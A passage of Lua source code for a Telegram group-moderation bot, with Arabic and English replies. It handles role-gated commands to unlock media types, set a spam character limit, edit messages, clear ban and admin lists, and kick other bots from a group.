hxousedx1:del(HXOUSE..'bot:links:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:location:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'tags:lock'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:strict'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:hashtag:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:contact:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:webpage:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:arabic:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:english:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:sticker:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:forward:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ all » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  كل الوسائط سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "text" or unmutepts[2] == "الدردشه" then
if hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock text ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الدردشه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:text:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ text » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الدردشه سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "photo" or unmutepts[2] == "الصور" then
if hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock photo ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الصور  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 57, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:photo:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ photo » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الصور سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "spam" or unmutepts[2] == "الكلايش" then
if hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock spam ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الكلايش  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:spam:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ spam » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الكلايش سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "video" or unmutepts[2] == "الفيديو" then
if hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock video ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الفيديو  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:video:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ video » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الفيديو سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "file" or unmutepts[2] == "الملفات" then
if hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock file ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الملفات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:document:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ file » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الملفات سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "inline" or unmutepts[2] == "الاونلاين" then
if hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock inline ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الاونلاين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 61, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:inline:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ inline » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الاونلاين سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "markdown" or unmutepts[2] == "الماركداون" then
if hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock markdown ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الماركداون  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 62, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'markdown:lock'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ markdown » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الماركداون سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "gif" or unmutepts[2] == "المتحركه" then
if hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock gif ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   المتحركه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:gifs:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ gif » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  المتحركه سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "music" or unmutepts[2] == "الاغاني" then
if hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock music ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الاغاني  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:music:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ music » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الاغاني سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "voice" or unmutepts[2] == "الصوت" then
if hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock voice ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الصوت  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 57, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:voice:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ voice » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الصوت سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "links" or unmutepts[2] == "الروابط" then
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock links ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الروابط  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:links:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ links » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الروابط سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "location" or unmutepts[2] == "المواقع" then
if hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock location ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   المواقع  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:location:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ location » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  المواقع سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "tag" or unmutepts[2] == "المعرف" then
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock tag ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   المعرف  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'tags:lock'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ tag » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  المعرف سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "strict" or unmutepts[2] == "الحمايه" then
if hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock strict ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الحمايه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:strict'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ strict » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الحمايه سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "hashtag" or unmutepts[2] == "الهاشتاك" then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock hashtag ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الهاشتاك  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:hashtag:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ hashtag » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الهاشتاك سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "contact" or unmutepts[2] == "الجهات" then
if hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock contact ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الجهات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:contact:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ contact » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الجهات سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "webpage" or unmutepts[2] == "الشبكات" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock webpage ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الشبكات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:webpage:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ webpag » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الشبكات سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "arabic" or unmutepts[2] == "العربيه" then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock arabic ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   العربيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:arabic:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ arabic » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  العربيه سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "english" or unmutepts[2] == "الانكليزيه" then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock english ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الانكليزيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 62, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:english:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ english » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الانكليزيه سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "tgservice" or unmutepts[2] == "الاشعارات" then
if hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock tgservice ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الاشعارات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 61, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:tgservice:jk'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ tgservice » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الاشعارات سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "sticker" or unmutepts[2] == "الملصقات" then
if hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock sticker ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الملصقات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:sticker:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ sticker » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الملصقات سابقا ༯', 1, 'md')
end
end
end
if unmutept[2] == "fwd" or unmutepts[2] == "التوجيه" then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock fwd ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   التوجيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:forward:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ fwd » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  التوجيه سابقا ༯', 1, 'md')
end
end
end
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etspam (%d+)$") then
local sensspam = {string.match(text, "^([Ss]etspam) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Enter a number greater than 40 ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ اختر عدد اكبر من 40 حرف ', 1, 'md')
end
else
hxousedx1:set(HXOUSE..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع عدد الاحرف '..sensspam[2]..' \n⌯︙ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف \n⌯︙ انا سوف اقوم بحذفها ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n⌯︙ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
if text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Enter a number greater than 40 ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ اختر عدد اكبر من 40 حرف ', 1, 'md')
end
else
hxousedx1:set(HXOUSE..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع عدد الاحرف '..sensspam[2]..' \n⌯︙ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف \n⌯︙ انا سوف اقوم بحذفها ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n⌯︙ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
end     
-----------------------------------------------------------------------------------------------
if is_sudo(msg) then
if text:match("^[Ee]dit (.*)$") then
local editmsg = {string.match(text, "^([Ee]dit) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil, editmsg[2], 1, 'html')
end
if text:match("^تعديل (.*)$") then
local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
end
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") and hxouse11(msg) then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(مسح) (.*)$")}
if txt[2] == 'banlist' or txts[2] == 'المحظورين' then
hxousedx1:del(HXOUSE..'bot:banned:'..msg.chat_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Banlist has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المحظورين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 34, string.len(msg.sender_user_id_))
end
end
if is_sudo(msg) then 
if txt[2] == 'banalllist' or txts[2] == 'قائمه العام' then
hxousedx1:del(HXOUSE..'bot:gban:')
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Banalllist has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح قائمه العام  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 34, string.len(msg.sender_user_id_))
end
end
end
if is_leader(msg) then 
if txt[2] == 'dev3' or txts[2] == 'مطورين الرتبه الثالثه' then
hxousedx1:del(HXOUSE..'bot:admins:')
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Banalllist has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح مطورين الرتبه الثالثه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 46, string.len(msg.sender_user_id_))
end
end
end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local hxouse = '⌯︙ تم مسح البوتات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 32, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txt[2] == 'monsh' or txts[2] == 'المنشئين' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ monsh list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المنشئين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 33, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:monsh2:'..msg.chat_id_)
end end
if txt[2] == 'modlist' or txts[2] == 'الادمنيه' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Mod list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح الادمنيه  \n⌯︙ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 33, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:momod:'..msg.chat_id_)
end
if txt[2] == 'donky list' or txts[2] == 'المطايه' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Mod list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المطايه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 32, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:donky:'..msg.chat_id_)
end
if txt[2] == 'voplist' or txts[2] == 'الاعضاء المميزين' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ VIP Members list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح الاعضاء المميزين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
